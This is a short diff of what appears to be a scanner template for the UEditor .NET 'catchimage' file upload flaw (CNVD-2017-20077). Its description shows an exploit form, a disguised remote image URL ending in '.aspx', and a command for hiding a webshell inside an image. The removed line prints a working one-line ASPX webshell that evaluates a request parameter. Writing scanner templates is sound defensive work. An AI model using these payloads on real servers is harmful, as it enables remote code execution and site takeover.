@@ -7,7 +7,6 @@ info:
   description: |
     <form action="http://8.8.8.8:8001/ueditor/net/controller.ashx?action=catchimage" enctype="multipart/form-data" method="POST">
     http://vps/11.jpg?.aspx 11.jpg是图片马；制作图片马：copy 1.jpg/b +2.aspx 3.aspx
-    aspx一句话：<%@ Page Language="Jscript"%><%eval(Request.Item["zan8in"],"unsafe");%>
   reference:
     - https://www.CNVD.org.cn/flaw/show/CNVD-2017-20077
     - https://zhuanlan.zhihu.com/p/85265552
